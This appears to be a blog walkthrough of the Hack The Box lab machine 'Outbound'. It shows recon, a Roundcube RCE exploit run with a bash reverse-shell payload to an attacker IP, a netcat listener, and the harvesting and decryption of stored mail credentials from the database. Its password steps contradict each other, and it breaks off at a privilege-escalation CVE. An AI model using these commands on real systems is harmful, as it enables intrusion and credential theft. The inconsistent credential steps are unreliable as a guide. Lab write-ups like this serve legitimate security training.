---
title: Outbound
date: 2026-06-05
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Port80-DNS-Discovery-Host
  - CMS-Roundcube-RCE
  - Linux-Privilege-Docker-Identify
  - Linux-Enumation-www-data
  - Revshell-bash-Upgrade
  - Linux-Enumation-Mysql
  - Linux-Privilege-Sudo-L
  - Linux
  - medium
lastmod: 2026-06-11T05:00:28.770Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Outbound" >}}

***

# Recon

As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2

### PORT & IP SCAN

The Nmap scan of the target IP `10.129.232.158` reveals two open ports: **Port 22**, which is running **OpenSSH 9.6p1** on an Ubuntu Linux system, and **Port 80**, which hosts an **Nginx 1.24.0** web server that attempts to redirect traffic to the domain `http://mail.outbound.htb/`.

```
┌─[tester@parrot]─[~/Desktop/VPN]
└──╼ $sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.232.158  -oN serviceScan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-05 10:27 HKT
Nmap scan report for 10.129.232.158
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.93 seconds


```

### SSH 22

```
┌─[tester@parrot]─[~/Desktop/VPN]
└──╼ $ssh tyler@10.129.232.158  -P 'LhKL1o9Nm3X2' 
The authenticity of host '10.129.232.158 (10.129.232.158)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.232.158' (ED25519) to the list of known hosts.
tyler@10.129.232.158's password: 
Permission denied, please try again.
tyler@10.129.232.158's password: 
Permission denied, please try again.
tyler@10.129.232.158's password: 

```

### Port 80

{{< toggle "Tag 🏷️" >}}

{{< tag "Port80-DNS-Discovery-Host" >}} When I search the website , I can see the web link with the domain , so I can add into /etc/hosts

{{< /toggle >}}

![Pasted image 20260605103047.png](/ob/Pasted%20image%2020260605103047.png)

```

┌─[✗]─[tester@parrot]─[~/Desktop/VPN]
└──╼ $sudo vim   /etc/hosts 
┌─[tester@parrot]─[~/Desktop/VPN]
└──╼ $cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
10.129.244.79   browsedinternals.htb
10.129.232.158 mail.outbound.htb outbound.htb
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

```

{{< toggle "Tag 🏷️" >}}

{{< tag "CMS-Roundcube-RCE" >}} View and search the Roundcube 's source code to find the version have the RCE

{{< /toggle >}}

![Pasted image 20260605103537.png](/ob/Pasted%20image%2020260605103537.png)

It’s an empty mailbox.

search the cms exploit

```
┌─[tester@parrot]─[~/Desktop/VPN]
└──╼ $whatweb http://mail.outbound.htb/
http://mail.outbound.htb/ [200 OK] Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[roundcube_sessid], IP[10.129.232.158], JQuery, PasswordField[_pass], RoundCube, Script, Title[Roundcube Webmail :: Welcome to Roundcube Webmail], X-Frame-Options[sameorigin], nginx[1.24.0]

```

search with the version

![Pasted image 20260605104224.png](/ob/Pasted%20image%2020260605104224.png)

and have the RCE

![Pasted image 20260605104254.png](/ob/Pasted%20image%2020260605104254.png)

```
┌─[tester@parrot]─[~/Desktop/HTB/outbound/CVE-2025-49113-exploit]
└──╼ $php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2  "bash -c 'bash -i >& /dev/tcp/10.10.16.128/443 0>&1'"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...

```

```
┌─[tester@parrot]─[~/Desktop/HTB/outbound/CVE-2025-49113-exploit]
└──╼ $sudo rlwrap nc -nvlp 443
[sudo] password for tester: 
Listening on 0.0.0.0 443
Connection received on 10.129.232.158 36364
bash: cannot set terminal process group (256): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$ whoami 
whoami 
www-data
www-data@mail:/$ 

```

### Linux

```
www-data@mail:/home$ ls
ls
jacob
mel
tyler
```

```
www-data@mail:/home$ cat /etc/passwd | grep 'sh$' 
cat /etc/passwd | grep 'sh$' 
root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000::/home/tyler:/bin/bash
jacob:x:1001:1001::/home/jacob:/bin/bash
mel:x:1002:1002::/home/mel:/bin/bash
```

```
bash: cd: jacob: Permission denied
www-data@mail:/home$ cd mel
cd mel
bash: cd: mel: Permission denied
www-data@mail:/home$ cd tyler
cd tyler
bash: cd: tyler: Permission denied
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Docker-Identify" >}} The hostname is a hint that perhaps this is not the main host. The IP address is 172.17.0.2, which confirms this is a container on docker ,There’s also a `.dockerenv` file in the root of the filesystem:

{{< /toggle >}}

```
www-data@mail:/var/www/html/roundcube$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 4a:b5:53:4d:e7:f0 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

There’s also a `.dockerenv` file in the root of the filesystem:

```
www-data@mail:/$ ls -a
ls -a
.
..
.dockerenv
bin
bin.usr-is-merged
boot
dev
etc
home
lib
lib.usr-is-merged
lib64
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Enumation-www-data" >}} If the user is www , probably the exploit is in the /var/www/ due to no other way to go

{{< /toggle >}}

```
www-data@mail:/var/www/html/roundcube$ cd config
cd config
www-data@mail:/var/www/html/roundcube/config$ ls
ls
config.inc.php
config.inc.php.sample
defaults.inc.php
mimetypes.php
www-data@mail:/var/www/html/roundcube/config$
```

Found the password

```
$config = [];                                                      
                                                                   
// Database connection string (DSN) for read+write operations                                                                          
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database                                                       
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle                                                       
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php                                                  
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'                                           
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'                                                                           
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';   
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Revshell-bash-Upgrade" >}} No Python available on the target system. Upgrading from a standard netcat reverse shell to a fully interactive TTY using the native Bash/script method, allowing for stable interactive command execution (like MySQL/MariaDB prompts).

{{< /toggle >}}\
When Python is unavailable on the target, use `script` and `stty` to stabilize the terminal environment before launching interactive CLI tools like MySQL.

Start an interactive bash session using script

```
www-data@mail:/$ script /dev/null -c bash
script /dev/null -c bash
```

Background the session

```
www-data@mail:/$  ctrl + z 
[1]+  Stopped                 sudo rlwrap nc -nvlp 443
```

Set local terminal to raw mode and foreground the listener

```
[✗]─[tester@parrot]─[~/Desktop/HTB/outbound/CVE-2025-49113-exploit]
└──╼ $stty raw -echo; fg
sudo rlwrap nc -nvlp 443
www-data@mail:/$ 
```

Reset the terminal configuration inside the reverse shell

```
www-data@mail:/$   reset
reset: unknown terminal type unknown
Terminal type? screen
```

Access the database interactively with full line-editing capabilities

```
mysql -u roundcube -pRCDBPass2025 roundcube
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 164
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [roundcube]> 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Enumation-Mysql" >}} Discovery the password in the config file , and connect the mysql to enum to find the user 's , how to decode the password is important ! I will enum the database 's  var tabel to have the session which is the a serialized PHP object , so using the ; with newlines to find the password and roundcube's decrypt.sh  can let me to have the correct password.

{{< /toggle >}}

The DB doesn’t have any other databases (at least not that this user can see):

```
MariaDB [roundcube]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)

```

```
MariaDB [roundcube]> show tables;
show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+

```

RoundCube itself does not store password hashes for users. When a user logs in, it authenticates that user against the mail server using the provided credentials. However, RoundCube also stores an encrypted copy of the logged in user’s credentials in the `session` table so that it can maintain the connection to the mail server without pestering the user.

```
MariaDB [roundcube]> select * from users;  
select * from users;  
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";} |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";} |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2026-06-05 03:08:24 | 2025-06-11 07:51:22 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+

```

The `session` table has the `vars` column:

```
MariaDB [roundcube]> select * from session \G;
select * from session \G;
*************************** 1. row ***************************
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
1 row in set (0.001 sec)

ERROR: No query specified

```

I’ll take the `vars` entry for my session and base64 decode it:

```
┌─[tester@parrot]─[~/Desktop/HTB/outbound/CVE-2025-49113-exploit]
└──╼ $ echo "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6ImhjVkNTTlhPWWdVWHZoQXJuMWExT0hKdERjaytDRk1FIjtsb2dpbl90aW1lfGk6MTc2Mjg4NTk5Njt0aW1lem9uZXxzOjM6IlVUQyI7U1RPUkFHRV9TUEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoiSzBRSTZmeHV0ZWFuNm5aSFl1MDU4WGl5MU8iO3JlcXVlc3RfdG9rZW58czozMjoic1JkNjZrQXhMbmJjQjZaTUZzZENiMnc3SDFzektwWm0iO3Rhc2t8czo0OiJtYWlsIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319aW1hcF9ob3N0fHM6OToibG9jYWxob3N0IjtwYWdlfGk6MTttYm94fHM6NToiSU5CT1giO3NvcnRfY29sfHM6MDoiIjtzb3J0X29yZGVyfHM6NDoiREVTQyI7U1RPUkFHRV9USFJFQUR8YTozOntpOjA7czoxMDoiUkVGRVJFTkNFUyI7aToxO3M6NDoiUkVGUyI7aToyO3M6MTQ6Ik9SREVSRURTVUJKRUNUIjt9U1RPUkFHRV9RVU9UQXxiOjA7U1RPUkFHRV9MSVNULUVYVEVOREVEfGI6MTtsaXN0X2F0dHJpYnxhOjY6e3M6NDoibmFtZSI7czo4OiJtZXNzYWdlcyI7czoyOiJpZCI7czoxMToibWVzc2FnZWxpc3QiO3M6NToiY2xhc3MiO3M6NDI6Imxpc3RpbmcgbWVzc2FnZWxpc3Qgc29ydGhlYWRlciBmaXhlZGhlYWRlciI7czoxNToiYXJpYS1sYWJlbGxlZGJ5IjtzOjIyOiJhcmlhLWxhYmVsLW1lc3NhZ2VsaXN0IjtzOjk6ImRhdGEtbGlzdCI7czoxMjoibWVzc2FnZV9saXN0IjtzOjE0OiJkYXRhLWxhYmVsLW1zZyI7czoxODoiVGhlIGxpc3QgaXMgZW1wdHkuIjt9dW5zZWVuX2NvdW50fGE6MTp7czo1OiJJTkJPWCI7aTowO30=" | base64 -d
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:3;username|s:5:"tyler";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"hcVCSNXOYgUXvhArn1a1OHJtDck+CFME";login_time|i:1762885996;timezone|s:3:"UTC";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"K0QI6fxutean6nZHYu058Xiy1O";request_token|s:32:"sRd66kAxLnbcB6ZMFsdCb2w7H1szKpZm";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:1:{s:5:"INBOX";i:0;}
```

It’s a serialized PHP object. Most items take a format similar to `<key>|s:<length>:<value>`. To look at each item, I’ll replace the “;” with newlines:

```
┌─[tester@parrot]─[~/Desktop/HTB/outbound/CVE-2025-49113-exploit]
└──╼ $echo "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6ImhjVkNTTlhPWWdVWHZoQXJuMWExT0hKdERjaytDRk1FIjtsb2dpbl90aW1lfGk6MTc2Mjg4NTk5Njt0aW1lem9uZXxzOjM6IlVUQyI7U1RPUkFHRV9TUEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoiSzBRSTZmeHV0ZWFuNm5aSFl1MDU4WGl5MU8iO3JlcXVlc3RfdG9rZW58czozMjoic1JkNjZrQXhMbmJjQjZaTUZzZENiMnc3SDFzektwWm0iO3Rhc2t8czo0OiJtYWlsIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319aW1hcF9ob3N0fHM6OToibG9jYWxob3N0IjtwYWdlfGk6MTttYm94fHM6NToiSU5CT1giO3NvcnRfY29sfHM6MDoiIjtzb3J0X29yZGVyfHM6NDoiREVTQyI7U1RPUkFHRV9USFJFQUR8YTozOntpOjA7czoxMDoiUkVGRVJFTkNFUyI7aToxO3M6NDoiUkVGUyI7aToyO3M6MTQ6Ik9SREVSRURTVUJKRUNUIjt9U1RPUkFHRV9RVU9UQXxiOjA7U1RPUkFHRV9MSVNULUVYVEVOREVEfGI6MTtsaXN0X2F0dHJpYnxhOjY6e3M6NDoibmFtZSI7czo4OiJtZXNzYWdlcyI7czoyOiJpZCI7czoxMToibWVzc2FnZWxpc3QiO3M6NToiY2xhc3MiO3M6NDI6Imxpc3RpbmcgbWVzc2FnZWxpc3Qgc29ydGhlYWRlciBmaXhlZGhlYWRlciI7czoxNToiYXJpYS1sYWJlbGxlZGJ5IjtzOjIyOiJhcmlhLWxhYmVsLW1lc3NhZ2VsaXN0IjtzOjk6ImRhdGEtbGlzdCI7czoxMjoibWVzc2FnZV9saXN0IjtzOjE0OiJkYXRhLWxhYmVsLW1zZyI7czoxODoiVGhlIGxpc3QgaXMgZW1wdHkuIjt9dW5zZWVuX2NvdW50fGE6MTp7czo1OiJJTkJPWCI7aTowO30=" | base64 -d | tr ';' '\n'
language|s:5:"en_US"
imap_namespace|a:4:{s:8:"personal"
a:1:{i:0
a:2:{i:0
s:0:""
i:1
s:1:"/"
}}s:5:"other"
N
s:6:"shared"
N
s:10:"prefix_out"
s:0:""
}imap_delimiter|s:1:"/"
imap_list_conf|a:2:{i:0
N
i:1
a:0:{}}user_id|i:3
username|s:5:"tyler"
storage_host|s:9:"localhost"
storage_port|i:143
storage_ssl|b:0
password|s:32:"hcVCSNXOYgUXvhArn1a1OHJtDck+CFME"
login_time|i:1762885996
timezone|s:3:"UTC"
STORAGE_SPECIAL-USE|b:1
auth_secret|s:26:"K0QI6fxutean6nZHYu058Xiy1O"
request_token|s:32:"sRd66kAxLnbcB6ZMFsdCb2w7H1szKpZm"
task|s:4:"mail"
skin_config|a:7:{s:17:"supported_layouts"
a:1:{i:0
s:10:"widescreen"
}s:22:"jquery_ui_colors_theme"
s:9:"bootstrap"
s:18:"embed_css_location"
s:17:"/styles/embed.css"
s:19:"editor_css_location"
s:17:"/styles/embed.css"
s:17:"dark_mode_support"
b:1
s:26:"media_browser_css_location"
s:4:"none"
s:21:"additional_logo_types"
a:3:{i:0
s:4:"dark"
i:1
s:5:"small"
i:2
s:10:"small-dark"
}}imap_host|s:9:"localhost"
page|i:1
mbox|s:5:"INBOX"
sort_col|s:0:""
sort_order|s:4:"DESC"
STORAGE_THREAD|a:3:{i:0
s:10:"REFERENCES"
i:1
s:4:"REFS"
i:2
s:14:"ORDEREDSUBJECT"
}STORAGE_QUOTA|b:0
STORAGE_LIST-EXTENDED|b:1
list_attrib|a:6:{s:4:"name"
s:8:"messages"
s:2:"id"
s:11:"messagelist"
s:5:"class"
s:42:"listing messagelist sortheader fixedheader"
s:15:"aria-labelledby"
s:22:"aria-label-messagelist"
s:9:"data-list"
s:12:"message_list"
s:14:"data-label-msg"
s:18:"The list is empty."
}unseen_count|a:1:{s:5:"INBOX"
i:0
}┌
```

One that jumps out is:

```
password|s:32:"hcVCSNXOYgUXvhArn1a1OHJtDck+CFME"
```

### decrypt.sh

RoundCube has a `decrypt.sh` script in the `bin` directory that will handle this decryption:

```
bash: ./bin/decrypt.sh: No such file or directory
www-data@mail:/$ /var/www/html/roundcube/bin/decrypt.sh     
/var/www/html/roundcube/bin/decrypt.sh     
Usage: decrypt.sh encrypted-hdr-part [encrypted-hdr-part ...]

```

```
www-data@mail:/$ /var/www/html/roundcube/bin/decrypt.sh      hcVCSNXOYgUXvhArn1a1OHJtDck+CFME
<in/decrypt.sh      hcVCSNXOYgUXvhArn1a1OHJtDck+CFME
LhKL1o9Nm3X2

```

This password does work to log into RoundCube as jacob:

![Pasted image 20260605112013.png](/ob/Pasted%20image%2020260605112013.png)

# Shell as root

### SSH

```
[tester@parrot]─[~/Desktop/HTB/outbound/CVE-2025-49113-exploit]
└──╼ $sshpass -p gY4Wr3a1evp4 ssh jacob@10.129.232.158
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jun  5 03:21:35 AM UTC 2026

  System load:  0.0               Processes:             255
  Usage of /:   74.8% of 6.73GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.129.232.158
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Tue Jul 22 10:17:57 2025 from 10.10.14.77
jacob@outbound:~$ 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Sudo-L" >}} Using the sudo -L to know below can be run without password , with the exploit , I can have the root RCE

{{< /toggle >}}

```
jacob@outbound:~$ sudo -l 
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*

```

[Below](https://github.com/facebookincubator/below) is:  [以下是：](https://github.com/facebookincubator/below)

an interactive tool to view and record historical system data.

Searching for CVEs in `below` finds [CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591):

